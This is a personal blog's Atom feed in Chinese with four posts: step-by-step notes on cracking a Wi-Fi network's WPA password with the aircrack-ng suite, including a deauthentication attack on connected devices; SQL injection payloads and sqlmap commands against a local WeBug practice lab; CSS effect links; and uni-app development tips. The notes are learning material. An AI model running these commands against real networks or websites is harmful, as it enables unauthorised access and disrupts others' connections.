<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>阿沈是也</title>
  
  <subtitle>敲代码中...</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2021-04-08T03:18:06.354Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>阿沈是也</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Kali-Linux学习笔记</title>
    <link href="http://yoursite.com/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/20201011-3c7be9e6.html"/>
    <id>http://yoursite.com/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/20201011-3c7be9e6.html</id>
    <published>2020-10-11T11:42:21.000Z</published>
    <updated>2021-04-08T03:18:06.354Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>Kali-Linux学习笔记</p></blockquote><h3 id="无线wifi密码-暴力破解"><a href="#无线wifi密码-暴力破解" class="headerlink" title="无线wifi密码-暴力破解"></a>无线wifi密码-暴力破解</h3><h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><ul><li>外部设备：无线网卡</li><li>操作系统：Kali-Linux-2020.3-vmware-amd64</li></ul><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><ol><li>插入“无线网卡”</li></ol><p><img src="/images/2020-10-11-20-22-20.png" alt></p><p><img src="/images/2020-10-11-19-58-25.png" alt></p><!-- 2. 打开`终端`，输入`sudo -i`使用管理员权限 --><ol start="2"><li><p>输入<code>iwconfig</code> 查看是否存在 <code>wlan0</code></p></li><li><p>开启监听 <code>sudo airmon-ng start wlan0</code></p></li><li><p>扫描附近的<code>wifi</code>，确定目标<code>wifi</code>的MAC地址<code>BSSID</code>及频道号<code>CH</code></p></li><li><p>监听目标wifi，尝试捕获目标wifi的握手包，输入<code>sudo airodump-ng wlan0mon -c &lt;步骤4的CH&gt; --bssid &lt;步骤4的BSSID&gt; -w &lt;握手包存放位置，例如：~/Documents/wlan/wlan0mon&gt;</code>，如同，取得已经与目标wifi建立连接的设备的<code>BSSID</code>及<code>STATION</code></p></li></ol><p><img src="/images/2020-10-11-21-36-11.png" alt></p><ol start="6"><li>由于握手包是设备和wifi之间建立连接时所产生的，因此需要对已经建立与目标wifi连接的设备进行断网攻击（aireplay-ng -0），保留步骤4的终端，打开新终端进行断网攻击，输入：<code>sudo aireplay-ng -0 &lt;攻击次数，例如：20&gt; -a &lt;步骤4取得的目标WiFi的BSSID&gt; -c &lt;步骤5取得的与目标wifi建立连接的某设备BSSID&gt; wlan0mon</code>，如图，在最后两次攻击时，目标设置已经与目标wiif断开连接</li></ol><p><img src="/images/2020-10-11-21-54-21.png" alt></p><ol start="7"><li>等待步骤6的目标设备与目标wifi重新建立连接，其后，回到步骤5的终端，可以看到已经抓取到了握手包</li></ol><p><img src="/images/2020-10-11-21-59-56.png" alt></p><ol start="8"><li><p>因为已经抓取到握手包，所以无需再使用无线网卡，可以停止网卡的监听，输入：<code>sudo airmon-ng stop wlan0mon</code></p></li><li><p>握手包包含设备与wifi的建立连接的验证密钥，因此可对握手包进行暴力破解，输入：<code>sudo aircrack-ng -a2 -b &lt;步骤4取得的目标WiFi的BSSID&gt; -w &lt;字典位置，例如：~/Documents/rockyou.txt&gt; &lt;握手包存放位置，若使用了步骤5的路径，则是：~/Documents/wlan/*.cap&gt;</code></p></li></ol><p><img src="/images/2020-10-11-22-30-12.png" alt></p><h3 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h3><ul><li><p>需要使用无线网卡，最好是能兼容linux免驱动的型号</p></li><li><p>由于是使用暴力破解的方式，因为破解wifi密码的重点在于字典上，需要字典足够大到能包含目标wifi密码，因此需要对字典进行迭代补充</p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="操作系统" scheme="http://yoursite.com/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="网络安全" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
      <category term="kaili" scheme="http://yoursite.com/tags/kaili/"/>
    
  </entry>
  
  <entry>
    <title>前端特效练习</title>
    <link href="http://yoursite.com/%E5%89%8D%E7%AB%AF%E6%A0%B7%E5%BC%8F/20200920-ef48afc1.html"/>
    <id>http://yoursite.com/%E5%89%8D%E7%AB%AF%E6%A0%B7%E5%BC%8F/20200920-ef48afc1.html</id>
    <published>2020-09-20T02:43:49.000Z</published>
    <updated>2021-04-08T03:18:06.377Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>日拱一卒</p></blockquote><!-- # 引言 --><a id="more"></a><h2 id="CSS-悬停效果"><a href="#CSS-悬停效果" class="headerlink" title="CSS 悬停效果"></a>CSS 悬停效果</h2><blockquote><p>2020-09-20</p></blockquote><p>源码：<a href="https://codepen.io/ashen114/pen/BaKGzaO" rel="external nofollow noopener noreferrer" target="_blank">CSS悬停效果</a></p><p>效果：</p><p><img src="/images/css-20092301.gif" alt></p><h2 id="3D-视频立方体特效"><a href="#3D-视频立方体特效" class="headerlink" title="3D 视频立方体特效"></a>3D 视频立方体特效</h2><p>源码：<a href="https://codepen.io/ashen114/pen/qbzvbor" rel="external nofollow noopener noreferrer" target="_blank">3D 视频立方体特效</a></p><p>效果：</p><p><img src="/images/css-20092401.gif" alt></p><h2 id="聚光灯特效"><a href="#聚光灯特效" class="headerlink" title="聚光灯特效"></a>聚光灯特效</h2><p>源码：<a href="https://codepen.io/ashen114/pen/vYGPLov" rel="external nofollow noopener noreferrer" target="_blank">聚光灯效果</a></p><p>效果：</p><p><img src="/images/css-20092501.gif" alt></p><p>## </p><blockquote><p>2020-09-21</p></blockquote><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><!-- # 后记 -->]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;日拱一卒&lt;/p&gt;
&lt;/blockquote&gt;
&lt;!-- # 引言 --&gt;
    
    </summary>
    
    
      <category term="前端样式" scheme="http://yoursite.com/categories/%E5%89%8D%E7%AB%AF%E6%A0%B7%E5%BC%8F/"/>
    
    
      <category term="笔记" scheme="http://yoursite.com/tags/%E7%AC%94%E8%AE%B0/"/>
    
      <category term="CSS" scheme="http://yoursite.com/tags/CSS/"/>
    
      <category term="前端样式" scheme="http://yoursite.com/tags/%E5%89%8D%E7%AB%AF%E6%A0%B7%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>WeBug4.0练习笔记</title>
    <link href="http://yoursite.com/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/20200519-b6f28a8a.html"/>
    <id>http://yoursite.com/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/20200519-b6f28a8a.html</id>
    <published>2020-05-19T12:18:48.000Z</published>
    <updated>2021-04-08T03:18:06.375Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>网络安全测试笔记</p></blockquote><h2 id="下载部署"><a href="#下载部署" class="headerlink" title="下载部署"></a>下载部署</h2><ul><li><p>WeBug4.0</p><ul><li>下载：<a href="https://pan.baidu.com/s/1PiipS0Iheegdb2Y0gaFM8w" rel="external nofollow noopener noreferrer" target="_blank">https://pan.baidu.com/s/1PiipS0Iheegdb2Y0gaFM8w</a> 提取码: rbrg</li></ul></li><li><p>hackbar: 火狐新版hackbar收费，解决方案如下：</p><ol><li>旧版：<a href="https://github.com/HCTYMFF/hackbar2.1.3/archive/master.zip" rel="external nofollow noopener noreferrer" target="_blank">https://github.com/HCTYMFF/hackbar2.1.3/archive/master.zip</a></li><li>替代插件：<a href="https://addons.mozilla.org/zh-CN/firefox/addon/max-hackbar/?src=search" rel="external nofollow noopener noreferrer" target="_blank">https://addons.mozilla.org/zh-CN/firefox/addon/max-hackbar/?src=search</a></li></ol></li></ul><h2 id="学习记录"><a href="#学习记录" class="headerlink" title="学习记录"></a>学习记录</h2><p>工具准备：</p><ul><li><p>JAVA环境:</p><ul><li>下载：<a href="https://www.oracle.com/java/technologies/javase/javase-jdk8-downloads.html" rel="external nofollow noopener noreferrer" target="_blank">https://www.oracle.com/java/technologies/javase/javase-jdk8-downloads.html</a></li></ul></li><li><p>Python环境:</p><ul><li>当前版本：python-2.7.15rc1.msi</li><li>下载：<a href="https://npm.taobao.org/mirrors/python/3.8.3/" rel="external nofollow noopener noreferrer" target="_blank">https://npm.taobao.org/mirrors/python/3.8.3/</a> （因为下述使用的sqlmap是基于python2.7的）</li><li>配置教程：<a href="https://blog.csdn.net/ITLearnHall/article/details/81318939" rel="external nofollow noopener noreferrer" target="_blank">Python2.x安装教程及环境变量配置</a></li></ul></li></ul><blockquote><p>Windows系统不重启而使环境变量生效的方法<br>以修改环境变量<code>PATH</code>为例，修改完成后，运行<code>cmd</code>，输入<code>set PATH=C:</code>，关闭DOS窗口。再次运行<code>cmd</code>，输入<code>echo %PATH%</code>，可以发现<code>我的电脑</code>-&gt;<code>属性</code>-&gt;<code>高级</code>-&gt;<code>环境变量</code>中设置的 <code>PATH</code>值已经生效。</p></blockquote><ul><li><p>BurpSuie: </p><ul><li>下载链接: <a href="https://pan.baidu.com/s/1F36mvPsWv3Buk0G-UaKr7A" rel="external nofollow noopener noreferrer" target="_blank">https://pan.baidu.com/s/1F36mvPsWv3Buk0G-UaKr7A</a> 提取码: 9hzm</li><li>配置教程：<a href="http://www.vuln.cn/8847" rel="external nofollow noopener noreferrer" target="_blank">最新BurpSuite 1.7.32 破解版[注册机]下载【无后门版】</a></li></ul></li><li><p>sqlmap:</p><ul><li>下载链接：<a href="http://sqlmap.org/" rel="external nofollow noopener noreferrer" target="_blank">http://sqlmap.org/</a></li></ul></li></ul><h3 id="显错注入"><a href="#显错注入" class="headerlink" title="显错注入"></a>显错注入</h3><blockquote><p>报错型：<br>构造payload让信息通过错误提示回显出来，一种类型（其它的暂时不怎么了解）是先报字段数，再利用后台数据库报错机制回显（跟一般的报错区别是，一般的报错注入是爆出字段数后，在此基础通过正确的查询语句，使结果回显到页面；后者是在爆出字段数的基础上使用能触发SQL报错机制的注入语句）</p></blockquote><p>参考资料：<a href="https://blog.csdn.net/weixin_40709439/article/details/81355856" rel="external nofollow noopener noreferrer" target="_blank">https://blog.csdn.net/weixin_40709439/article/details/81355856</a></p><h4 id="方法一：手动注入"><a href="#方法一：手动注入" class="headerlink" title="方法一：手动注入"></a>方法一：手动注入</h4><ol><li><p>由地址的<code>?id=1</code>可尝试猜想表的列数，构造<code>?id=1&#39; order by 1 %23&#39;</code>，依次推演</p></li><li><p>发现到<code>?id=1&#39; order by 3 %23&#39;</code>报错，猜想列表有两行，构造<code>&#39; union select 1,group_concat(schema_name) from information_schema.schemata%23</code></p></li><li><p>构造<code>&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;flag&#39; %23</code></p></li><li><p>构造<code>&#39; union select 1,flag from webug.flag %23</code></p></li></ol><h4 id="方法二：使用sqlmap注入"><a href="#方法二：使用sqlmap注入" class="headerlink" title="方法二：使用sqlmap注入"></a>方法二：使用sqlmap注入</h4><ol><li>获取当前id对应的数据库：<code>python sqlmap.py -u  http://localhost/control/sqlinject/manifest_error.php?id=1 -p id --current-db</code></li></ol><p><img src="/images/page/safe/2020-05-21-20-49-20.png" alt></p><ol start="2"><li>获取<code>webug</code>数据库存在的表：<code>python sqlmap.py -u  http://localhost/control/sqlinject/manifest_error.php?id=1 -p id -D webug --tables</code></li></ol><p><img src="/images/page/safe/2020-05-21-20-51-24.png" alt></p><ol start="3"><li>获取flag的值：<code>python sqlmap.py -u  http://localhost/control/sqlinject/manifest_error.php?id=1 -p id -D webug -T flag --dump</code></li></ol><p><img src="/images/page/safe/2020-05-21-20-53-37.png" alt></p><hr><h3 id="布尔注入："><a href="#布尔注入：" class="headerlink" title="布尔注入："></a>布尔注入：</h3><blockquote><p>布尔型：<br>页面只返回True和False两种类型页面。利用页面返回不同，逐个猜解数据</p></blockquote><p>参考资料：<a href="https://blog.csdn.net/weixin_40709439/article/details/81355856" rel="external nofollow noopener noreferrer" target="_blank">https://blog.csdn.net/weixin_40709439/article/details/81355856</a></p><h4 id="方法一：手动布尔注入"><a href="#方法一：手动布尔注入" class="headerlink" title="方法一：手动布尔注入"></a>方法一：手动布尔注入</h4><p>暂无</p><h4 id="方法二：使用sqlmap注入-1"><a href="#方法二：使用sqlmap注入-1" class="headerlink" title="方法二：使用sqlmap注入"></a>方法二：使用sqlmap注入</h4><ol><li>获取当前数据库：<code>python sqlmap.py -u  http://localhost/control/sqlinject/bool_injection.php?id=1 -p id --current-db</code></li></ol><p><img src="/images/page/safe/2020-05-21-21-04-41.png" alt></p><ol start="2"><li>获取webug数据库的表：<code>python sqlmap.py -u  http://localhost/control/sqlinject/bool_injection.php?id=1 -p id -D webug --tables</code></li></ol><p><img src="/images/page/safe/2020-05-21-21-06-12.png" alt></p><ol start="3"><li><p>获取flag的值，提交FLAG的时候报错！</p></li><li><p>换个表，<code>python sqlmap.py -u http://localhost/control/sqlinject/bool_injection.php?id=1 -D webug -T env_list --dump</code></p></li></ol><p><img src="/images/page/safe/2020-05-25-19-40-05.png" alt></p><ol start="5"><li>获取flag值：fdsafsdfa</li></ol><hr><h3 id="延时注入："><a href="#延时注入：" class="headerlink" title="延时注入："></a>延时注入：</h3><blockquote><p>时间型：通过页面沉睡时间判断<br>通过 sleep（）函数测试，通过if（）和sleep（）联合逐个猜解数据</p></blockquote><p>参考资料：<a href="https://blog.csdn.net/weixin_40709439/article/details/81355856" rel="external nofollow noopener noreferrer" target="_blank">https://blog.csdn.net/weixin_40709439/article/details/81355856</a></p><h4 id="方法一：延时注入"><a href="#方法一：延时注入" class="headerlink" title="方法一：延时注入"></a>方法一：延时注入</h4><p>暂无</p><h4 id="方法二：使用sqlmap注入-2"><a href="#方法二：使用sqlmap注入-2" class="headerlink" title="方法二：使用sqlmap注入"></a>方法二：使用sqlmap注入</h4><ol><li>方法同上</li></ol><hr><h3 id="post注入"><a href="#post注入" class="headerlink" title="post注入"></a>post注入</h3>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="网络安全" scheme="http://yoursite.com/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="网络安全" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
      <category term="WeBug" scheme="http://yoursite.com/tags/WeBug/"/>
    
  </entry>
  
  <entry>
    <title>uni-app 踩坑记录</title>
    <link href="http://yoursite.com/uni-app/20200421-da8f636f.html"/>
    <id>http://yoursite.com/uni-app/20200421-da8f636f.html</id>
    <published>2020-04-21T08:58:51.000Z</published>
    <updated>2021-04-08T03:18:06.374Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><a id="more"></a><h1 id="uni-app-踩坑记录"><a href="#uni-app-踩坑记录" class="headerlink" title="uni-app 踩坑记录"></a>uni-app 踩坑记录</h1><h2 id="安装-amp-配置"><a href="#安装-amp-配置" class="headerlink" title="安装&amp;配置"></a>安装&amp;配置</h2><blockquote><p>安装uni-app模板时，node版本需要大于10.14，推荐使用nvm安装node，便于切换node版本</p></blockquote><p><code>npm install -g @vue/cli</code></p><p><code>vue create -p dcloudio/uni-preset-vue my-project</code></p><p><del><code>npm i @dcloudio/uni-helper-json</code> uni-组件语法提示</del></p><p><del><code>npm i @types/uni-app @types/html5plus -D</code> uni语法提示</del></p><p><code>uni</code>项目下的<code>json</code>文件，因为带有注释，推荐使用<code>jsonc</code>语言模式，以便消除报错提示</p><p>让vscode支持nve格式的文件，先安装<code>vetur</code>插件，然后：在<code>文件</code>-<code>首选项</code>-<code>设置</code>中输入<code>associations</code>，找到<code>Files:Associations</code>选择其下方的<code>进入setting.json中设置</code>，加入<code>&quot;*.nvue&quot;: &quot;html&quot;</code>，然后重新加载窗口(可以通过<code>F1</code>，然后输入<code>重新加载窗口</code>进行重载窗口)，完整版如下：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">"files.associations": &#123;</span><br><span class="line">    "*.nvue": "html"</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>使用yarn安装依赖时，若出现问题，把yarn.lock和node_modules删除再试</p><hr><h2 id="开发"><a href="#开发" class="headerlink" title="开发"></a>开发</h2><h3 id="功能模块"><a href="#功能模块" class="headerlink" title="功能模块"></a>功能模块</h3><h4 id="第三方登录"><a href="#第三方登录" class="headerlink" title="第三方登录"></a>第三方登录</h4><p>在<code>src\manifest.json</code>中配置相关的模块，若是HBuilderX，则如下：</p><p><img src="/images/page/note/2020-04-21-16-31-55.png" alt></p><p>然后在下图所示中进行对应的配置：</p><p><img src="/images/page/note/2020-04-21-16-33-19.png" alt></p><h3 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h3><h4 id="消息推送"><a href="#消息推送" class="headerlink" title="消息推送"></a>消息推送</h4><blockquote><p>使用uni提供的Uni Push</p></blockquote><ol><li><p>在项目中配置push模块</p><p> 在<code>src\manifest.json</code>中配置相关的模块，若是HBuilderX，则如下：</p><p> <img src="/images/page/note/2020-04-21-15-55-04.png" alt></p></li><li><p>在项目中使用<code>plus.push.getClientInfo</code>获取客户端CID，方便后期针对性调试，例如：</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">getCInfo()&#123;</span><br><span class="line">    <span class="built_in">document</span>.addEventListener(<span class="string">'plusready'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="comment">// 页面加载时触发  </span></span><br><span class="line">        <span class="keyword">let</span> pinf = plus.push.getClientInfo();  </span><br><span class="line">        <span class="keyword">let</span> cid = pinf.clientid;<span class="comment">//客户端标识  </span></span><br><span class="line">    &#125;, <span class="literal">false</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>运行项目，具体可参考步骤<a href="#运测">“运行&amp;测试”</a></p></li><li><p>后台推送</p><p>主要有两种方法，一是使用DCloud管理后台，二是自己搭建服务端：</p><ol><li><p>在DCloud管理后台使用<code>Uni Push</code>进行推送</p><p>  进入DCloud后台:<a href="https://dev.dcloud.net.cn/uni/push?appid=__UNI__596F7C0&amp;type=0" rel="external nofollow noopener noreferrer" target="_blank">https://dev.dcloud.net.cn/uni/push?appid=<strong>UNI</strong>596F7C0&amp;type=0</a>，在Uni Push中分为两种事件，如下：</p><p>  <img src="/images/page/note/2020-04-21-16-11-02.png" alt></p><p>  可在应用入口对该通知消息及透传消息进行监听，具体可参考：<a href="https://ask.dcloud.net.cn/article/34" rel="external nofollow noopener noreferrer" target="_blank">https://ask.dcloud.net.cn/article/34</a></p><blockquote><p><em>通知消息</em>可将通知展示到app的通知栏上，但是只能监听点击事件；<em>透传消息</em>只能通过无形的方式传递到app中，但是可以通过对<code>receive</code>进行监听以获取传递过来的信息。</p></blockquote><p>  在调试消息功能模块时，在<code>预览消息</code>的时候，可以使用上述步骤2中获取到的<code>clientid</code>进行特定预览。</p></li><li><p>使用Node搭建消息推送服务</p><p>  原理文档：<a href="https://ask.dcloud.net.cn/article/35622" rel="external nofollow noopener noreferrer" target="_blank">https://ask.dcloud.net.cn/article/35622</a></p><p>  <img src="/images/page/note/2020-04-28-19-04-14.png" alt></p><p>  参考文档：<a href="http://docs.getui.com/getui/server/nodejs/start/" rel="external nofollow noopener noreferrer" target="_blank">http://docs.getui.com/getui/server/nodejs/start/</a></p>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 消息模版：</span></span><br><span class="line"><span class="comment">// 1.TransmissionTemplate:透传功能模板</span></span><br><span class="line"><span class="comment">// 2.LinkTemplate:通知打开链接功能模板</span></span><br><span class="line"><span class="comment">// 3.NotificationTemplate：通知透传功能模板</span></span><br><span class="line"><span class="comment">// 4.NotyPopLoadTemplate：通知弹框下载功能模板</span></span><br></pre></td></tr></table></figure></li></ol></li></ol><h4 id="语音播报"><a href="#语音播报" class="headerlink" title="语音播报"></a>语音播报</h4><blockquote><p>使用 <code>百度语音合成接口</code> 插件</p></blockquote><p>插件链接：<a href="https://ext.dcloud.net.cn/plugin?id=182" rel="external nofollow noopener noreferrer" target="_blank">https://ext.dcloud.net.cn/plugin?id=182</a></p><p>可以通过监听<em>透传消息</em>进行<em>语音播报</em>提示</p><h4 id="拖拽排序组件"><a href="#拖拽排序组件" class="headerlink" title="拖拽排序组件"></a>拖拽排序组件</h4><p>插件链接：<a href="https://ext.dcloud.net.cn/plugin?id=582" rel="external nofollow noopener noreferrer" target="_blank">https://ext.dcloud.net.cn/plugin?id=582</a></p><p>若需要自定义删除标签的事件，可通过在组件中的close事件中发送$emit，其中由于存在对传入的list进行深度监听，可利用该功能，在父组件中合理改变list以触发事件。</p><hr><p id="运测"></p><h2 id="运行-amp-测试"><a href="#运行-amp-测试" class="headerlink" title="运行&amp;测试"></a>运行&amp;测试</h2><h3 id="虚拟机调试"><a href="#虚拟机调试" class="headerlink" title="虚拟机调试"></a>虚拟机调试</h3><ul><li>安装“360助手”</li><li>安装安卓模拟器（这里使用的是MuMu模拟器）</li></ul><p>配置模拟器端口</p><p><img src="/images/page/note/2020-07-20-18-24-58.png" alt></p><blockquote><p>更多模拟器端口参考：<a href="https://www.cnblogs.com/HakunaMatata-/p/10609307.html" rel="external nofollow noopener noreferrer" target="_blank">https://www.cnblogs.com/HakunaMatata-/p/10609307.html</a></p></blockquote><p>打开360助手，直接挂后台即可，不需要额外处理，仅作为连接HBuilderX及模拟器的工具</p><p>打开MuMu模拟器，作为调试模拟器</p><p>有两种基座种类的选择进行调试，如图所示，若使用自定义基座，请先进行“制作自定义基座”</p><p><img src="/images/page/note/2020-07-20-18-29-28.png" alt></p><h3 id="真机调试"><a href="#真机调试" class="headerlink" title="真机调试"></a>真机调试</h3><p>若是使用真机调试，可使用</p><p><img src="/images/page/note/2020-04-21-16-00-15.png" alt></p><p>此时，真机端需要通过USB连接电脑，且开启USB调试，然后</p><p><img src="/images/page/note/2020-04-21-16-00-42.png" alt></p><p>即可，每次更改代码会进行热更新</p><hr><h2 id="打包"><a href="#打包" class="headerlink" title="打包"></a>打包</h2><h3 id="安卓"><a href="#安卓" class="headerlink" title="安卓"></a>安卓</h3><h4 id="开发工具选择"><a href="#开发工具选择" class="headerlink" title="开发工具选择"></a>开发工具选择</h4><ol><li><p>HBuilderX<br> 使用<code>HBuilderX</code>打包，在<code>src/manifest.json</code>中进行相关配置</p></li><li><p>Android Studio</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">硬盘空间不足，取消android studio的打包方式#</span><br><span class="line"></span><br><span class="line">jre配置，用于安卓设备的证书生成：</span><br><span class="line"></span><br><span class="line">参考链接：https://ask.dcloud.net.cn/article/35777</span><br><span class="line"></span><br><span class="line">下载来源：https://www.oracle.com/java/technologies/javase-jre8-downloads.html</span><br><span class="line"></span><br><span class="line">window下载：https://download.oracle.com/otn/java/jdk/8u251-b08/3d5a2bb8f8d4428bbe94aed7ec7ae784/jre-8u251-windows-x64.exe</span><br></pre></td></tr></table></figure><h4 id="打包配置"><a href="#打包配置" class="headerlink" title="打包配置"></a>打包配置</h4><p>若使用HBuilder，则可以如下图所示，若还没appid等，按步骤进行即可</p><p><img src="/images/page/note/2020-04-21-16-39-18.png" alt></p><hr><h2 id="附加"><a href="#附加" class="headerlink" title="附加"></a>附加</h2><h3 id="样式问题"><a href="#样式问题" class="headerlink" title="样式问题"></a>样式问题</h3><p>nvue相对来说，对css的兼容性不佳，不推荐在nvue中使用丰富的样式，尤其是flex布局等</p><h3 id="文件名过长删除问题"><a href="#文件名过长删除问题" class="headerlink" title="文件名过长删除问题"></a>文件名过长删除问题</h3><p>删除文件名过长的文件，可以在其父级文件夹（例如:a）的同级目录下新建空文件夹，例如:b</p><p><code>robocopy b a /purge</code> a文件夹为需要删除的文件夹</p><p>执行命令后再手动删除a，b文件夹即可，此时可正常删除文件夹</p><h3 id="Vue模板输入框输入问题"><a href="#Vue模板输入框输入问题" class="headerlink" title="Vue模板输入框输入问题"></a>Vue模板输入框输入问题</h3><blockquote><p>下列方法问题：用户清除输入框时，输入框的内容会为空且不是期望的0</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"number"</span> <span class="attr">v-model</span>=<span class="string">"writeOffNum"</span> @<span class="attr">blur</span>=<span class="string">"bindInputWriteOffNum"</span>&gt;</span><span class="tag">&lt;/<span class="name">input</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 可核销数量规则</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param <span class="type">&#123;number&#125;</span> <span class="variable">value</span></span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param <span class="type">&#123;string&#125;</span> </span>changeType 可选 操作类型 'sub || 'add'</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">calWriteOffNumRule:<span class="function"><span class="keyword">function</span>(<span class="params">value,changeType</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> maxNum = <span class="keyword">this</span>.canVerifyNums; <span class="comment">// 最大可核销数</span></span><br><span class="line">    <span class="keyword">if</span>(changeType)&#123;</span><br><span class="line">    <span class="comment">// 若为点击事件</span></span><br><span class="line">    <span class="keyword">switch</span>(changeType)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'sub'</span>: </span><br><span class="line">        <span class="keyword">if</span>(value &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            value -= <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            value = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'add'</span>:</span><br><span class="line">        <span class="keyword">if</span>(value &lt; maxNum)&#123;</span><br><span class="line">            value += <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            value = maxNum</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">// 若为输入</span></span><br><span class="line">    <span class="keyword">if</span>(!value || <span class="built_in">isNaN</span>(value) || value &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        value = <span class="number">0</span>;</span><br><span class="line">    &#125;<span 